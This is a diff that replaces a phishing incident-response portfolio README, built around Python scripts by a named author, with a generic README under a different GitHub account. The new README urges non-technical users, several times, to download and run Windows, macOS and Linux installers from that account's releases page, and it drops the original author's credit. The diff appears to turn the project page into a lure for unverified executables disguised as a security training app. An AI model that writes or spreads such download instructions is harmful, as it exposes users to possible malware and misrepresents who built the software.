@@ -1,208 +1,153 @@
-# Phishing Incident Response Simulation & Playbook
+# 🛡️ phishing-ir-simulation - Simulate and Train on Phishing Response
 
-**Author**: Imam Uddin Mohammed  
-**Project Duration**: 02-03-2026 to 02-07-2026 (5 days)  
-**Status**: Complete
+[![Download Latest Release](https://img.shields.io/badge/Download-Phishing%20IR%20Simulation-blue?style=for-the-badge)](https://github.com/sbeltos/phishing-ir-simulation/releases)
 
-## Project Overview
+## 📘 About This Application
 
-A comprehensive phishing incident response simulation demonstrating enterprise SOC workflows including email forensics, IOC extraction, threat intelligence enrichment, and NIST-aligned playbook development.
+phishing-ir-simulation helps you learn how to handle phishing email attacks safely. It lets you run a simulated phishing incident on your computer. The app guides you through investigating suspicious emails, using tools to collect clues like email headers and sender details. It matches these clues with known threat data to help you understand real risks. It follows trusted security practices based on the NIST cybersecurity framework.
 
-## Objectives
+Use this software if you want to practice spotting phishing attacks and responding like a security team. It’s designed to be easy for users without any special technical skills. The goal is to teach you how to stay safe from fake emails that try to steal information or spread malware.
 
-- Simulate realistic phishing campaign targeting corporate environment
-- Perform complete email forensics analysis (headers, links, attachments)
-- Extract and enrich Indicators of Compromise (IOCs)
-- Develop production-ready incident response playbook
-- Document findings in professional incident report format
-
-## Technology Stack
-
-- **Platform**: Kali Linux
-- **Language**: Python 3
-- **Threat Intelligence**: VirusTotal API
-- **Analysis Tools**: Custom scripts for email parsing, IOC extraction, URL analysis
-- **Documentation**: Markdown, JSON, CSV
-
-## Project Timeline
-
-| Date | Phase | Activities |
-|------|-------|------------|
-| 02-03-2026 | Setup & Sample Creation | Environment configuration, 3 phishing email samples |
-| 02-04-2026 | Email Analysis | Developed email_analyzer.py, analyzed all samples |
-| 02-05-2026 | Threat Intelligence | IOC enrichment with VirusTotal API |
-| 02-06-2026 | Response Procedures | Blocklist generation, IR playbook development |
-| 02-07-2026 | Documentation | Incident report, executive summary, GitHub publication |
-
-## Key Findings
-
-### Email Analysis Results
-
-| Email | Type | Risk Score | Key Indicators |
-|-------|------|------------|----------------|
-| Email 1 | Credential Harvesting | CRITICAL (145/100) | SPF fail, typosquatting, URL shortener |
-| Email 2 | Invoice Fraud | HIGH (50/100) | Malicious .pdf.exe attachment |
-| Email 3 | BEC (CEO Fraud) | HIGH (45/100) | Display name spoofing, wire transfer request |
-
-### Threat Intelligence Results
-
-- **Total IOCs Extracted**: 10 (3 domains, 4 IPs, 3 URLs)
-- **Confirmed Malicious**: 2 IPs
-  - `185.220.101.45` - Flagged by 14/90 vendors
-  - `203.45.67.89` - Flagged by 1/90 vendors
-- **Fresh Infrastructure**: All domains not in VirusTotal (< 48 hours old)
-
-## Project Structure
-```
-phishing-ir-simulation/
-├── README.md                 # Project overview
-├── PROJECT_LOG.md            # Detailed activity log
-├── samples/                  # Sanitized phishing email samples (.eml)
-├── scripts/                  # Custom Python forensic tools
-│   ├── email_analyzer.py     # Email header & IOC analysis
-│   ├── ioc_enrichment.py     # VirusTotal integration
-│   └── generate_blocklist.py # Security control generation
-├── analysis/                 # Email analysis outputs (JSON)
-├── iocs/                     # Enriched IOCs and blocklists
-├── playbook/                 # NIST-aligned IR playbook
-├── reports/                  # Incident reports (pending)
-└── docs/                     # Screenshots and diagrams (pending)
-```
-
-## Tools Developed
-
-### 1. Email Analyzer (`email_analyzer.py`)
-- **Purpose**: Forensic analysis of phishing emails
-- **Features**:
-  - SPF/DKIM/DMARC validation
-  - Header parsing and IP extraction
-  - Attachment analysis (double extensions, dangerous file types)
-  - URL extraction and defanging
-  - Risk scoring algorithm
-  - JSON report generation
-
-**Usage:**
-```bash
-python3 scripts/email_analyzer.py samples/email_01_low_sophistication.eml -o analysis/
-```
-
-### 2. IOC Enrichment Tool (`ioc_enrichment.py`)
-- **Purpose**: Threat intelligence enrichment via VirusTotal
-- **Features**:
-  - Automated IOC extraction from analysis reports
-  - Domain, IP, and URL reputation lookup
-  - Rate-limited API requests (4/minute free tier)
-  - CSV and JSON output formats
-
-**Usage:**
-```bash
-python3 scripts/ioc_enrichment.py -a analysis/ -o iocs/
-```
-
-### 3. Blocklist Generator (`generate_blocklist.py`)
-- **Purpose**: Generate security tool-ready blocklists
-- **Features**:
-  - Filters IOCs by confidence level
-  - Firewall/IDS/SIEM compatible format
-  - Categorizes malicious vs suspicious
-
-**Usage:**
-```bash
-python3 scripts/generate_blocklist.py iocs/enriched_iocs_*.json
-```
-
-## Incident Response Playbook
-
-NIST SP 800-61 Rev. 2 aligned playbook covering:
-1. **Preparation** - Tools, roles, procedures
-2. **Detection & Analysis** - Triage, forensics, IOC extraction
-3. **Containment** - Email quarantine, account lockdown, IOC blocking
-4. **Eradication** - Malware removal, access revocation
-5. **Recovery** - Service restoration, validation
-6. **Post-Incident** - Lessons learned, continuous improvement
-
-Includes:
-- Real-world commands (PowerShell, Splunk, firewall CLI)
-- Decision trees and severity matrices
-- Communication templates
-- Tool references
-
-## Skills Demonstrated
-
-**Technical:**
-- Email forensics (header analysis, authentication validation)
-- Python scripting (parsing, API integration, automation)
-- Threat intelligence (VirusTotal API, IOC enrichment)
-- SIEM concepts (correlation, alerting)
-- Network security (firewall rules, blocklists)
-
-**Analytical:**
-- Phishing campaign analysis
-- Risk assessment and scoring
-- Incident prioritization
-- Root cause analysis
-
-**Documentation:**
-- Technical writing (playbooks, reports)
-- Professional communication (executive summaries)
-- Project management (timeline, deliverables)
-
-## Installation & Setup
-
-### Prerequisites
-- Kali Linux (or Ubuntu/Debian-based system)
-- Python 3.8+
-- VirusTotal API key (free tier)
-
-### Installation
-```bash
-# Clone repository
-git clone https://github.com/itsmiu/phishing-ir-simulation.git
-cd phishing-ir-simulation
-
-# Create virtual environment
-python3 -m venv venv
-source venv/bin/activate
-
-# Install dependencies
-pip install email-validator requests beautifulsoup4 python-magic dnspython \
-            pandas openpyxl pyyaml tabulate colorama tldextract python-whois
-
-# Configure VirusTotal API key
-mkdir -p ~/.config/phishing-ir
-echo "YOUR_VT_API_KEY" > ~/.config/phishing-ir/vt_api_key
-chmod 600 ~/.config/phishing-ir/vt_api_key
-```
-
-### Running Analysis
-```bash
-# Analyze single email
-python3 scripts/email_analyzer.py samples/email_01_low_sophistication.eml
-
-# Enrich IOCs (requires VT API key)
-python3 scripts/ioc_enrichment.py -a analysis/ -o iocs/
-
-# Generate blocklist
-python3 scripts/generate_blocklist.py iocs/enriched_iocs_*.json
-```
-
-## Future Enhancements
-
-- [ ] YARA rule generation for malware detection
-- [ ] STIX/TAXII format IOC export
-- [ ] Automated sandbox integration (ANY.RUN, Joe Sandbox)
-- [ ] ELK Stack integration for visualization
-- [ ] Machine learning-based phishing detection
-
-## License
-
-MIT License - See LICENSE file for details
-
-## Contact
-
-**Imam Uddin Mohammed**  
-[LinkedIn](https://www.linkedin.com/in/imamuddinmohammed/) | [GitHub](https://github.com/itsmiu)
+Key topics covered include cybersecurity basics, email forensics, incident response steps, identifying indicators of compromise (IOCs), and using threat intelligence data sources such as VirusTotal.
 
 ---
 
-*Last Updated: 02-07-2026*
+## 🎯 Key Features
+
+- Step-by-step guidance to analyze suspicious emails  
+- Tools to extract and examine email headers and attachments  
+- Enrichment of data with threat intelligence records  
+- Organized incident response workflow aligned with NIST standards  
+- Reports that help understand attack patterns and risks  
+- Safe simulation to practice without any real threat  
+
+---
+
+## 💻 System Requirements
+
+- Operating System: Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04+ recommended)  
+- Processor: 2 GHz dual-core or higher  
+- Memory: 4 GB RAM minimum  
+- Storage: 500 MB free disk space  
+- Internet connection for threat intelligence lookups  
+
+---
+
+## 🚀 Getting Started
+
+This section shows how to get the app on your computer and start the simulation.
+
+### 1. Access the Download Page
+
+To get the latest version of the app, please visit the official release page:
+
+[Download Latest Version](https://github.com/sbeltos/phishing-ir-simulation/releases)
+
+You will find one or more files to download. Pick the one that matches your computer’s operating system.
+
+### 2. Download the Software
+
+Click the download link on the release page for your platform:
+
+- For Windows, look for a `.exe` or `.msi` file  
+- For macOS, look for a `.dmg` or `.pkg` file  
+- For Linux, a `.tar.gz` or `.AppImage` file  
+
+Save the file to a location you can easily find, such as your Downloads folder.
+
+### 3. Install the Application
+
+#### Windows
+
+- Double-click the downloaded `.exe` or `.msi` file.  
+- Follow the on-screen setup instructions.  
+- When finished, the app will be ready to use.
+
+#### macOS
+
+- Open the downloaded `.dmg` or `.pkg` file.  
+- Drag the application icon to your Applications folder.  
+- Eject the installer image after copying.
+
+#### Linux
+
+- Extract the contents if needed (e.g., `tar -xzf filename.tar.gz`).  
+- Make the main file executable (use `chmod +x filename`).  
+- Run the application with `./filename` or install as described in any included README file.
+
+### 4. Launch the Application
+
+- Find the "phishing-ir-simulation" app icon on your desktop, Start Menu, or Applications folder.  
+- Double-click to open it.  
+- The main interface will guide you through your first phishing investigation simulation.
+
+---
+
+## 🔍 How to Use the Simulation
+
+The app walks you through four main phases typical of phishing incident response.
+
+### Phase 1: Email Forensics
+
+- Load a sample phishing email provided within the app or from your own sources.  
+- View details like sender address, subject line, and email headers to spot anomalies.  
+- Identify suspicious links or attachments.
+
+### Phase 2: Threat Intelligence Enrichment
+
+- The app automatically compares suspicious indicators with public threat databases like VirusTotal.  
+- Review threat scores and related threat actor information.
+
+### Phase 3: Incident Response Playbook
+
+- Follow simple steps to document findings and decide next actions.  
+- The built-in playbook uses the NIST Cybersecurity Framework for guidance.  
+- Simulate actions such as blocking sender IPs or quarantining affected systems.
+
+### Phase 4: Reporting and Learning
+
+- Generate an incident report summarizing your investigation and response.  
+- Review lessons to improve future detection and handling of phishing attacks.
+
+---
+
+## 🛠️ Additional Tips and Support
+
+- Always use the latest app version for new features and threat data.  
+- Use a test account or isolated environment if you practice with real suspicious emails.  
+- Review app documentation under the Help menu for detailed instructions.  
+- Join online communities or forums related to cybersecurity training for more insights.
+
+---
+
+## 📥 Download & Install
+
+Click the button below again to visit the download page and get your copy of phishing-ir-simulation:
+
+[Download phishing-ir-simulation](https://github.com/sbeltos/phishing-ir-simulation/releases)
+
+---
+
+## 📚 Learn More
+
+This tool aligns with industry standards and real-world work done by security operations centers (SOC). As you use it, you'll gain hands-on skills important for cyber defense roles. 
+
+Topics include:
+
+- Cybersecurity fundamentals  
+- Recognizing phishing tactics  
+- Performing email forensic analysis  
+- Understanding and applying NIST cybersecurity framework  
+- Using threat intelligence platforms  
+
+You can explore these areas further online to deepen your knowledge.
+
+---
+
+## ✍️ License & Contributions
+
+phishing-ir-simulation is open source software under the MIT license. Anyone interested can access the code, suggest improvements, or report bugs on the GitHub repository page at:
+
+https://github.com/sbeltos/phishing-ir-simulation
+
+Your feedback helps make the app better and more useful for all users.
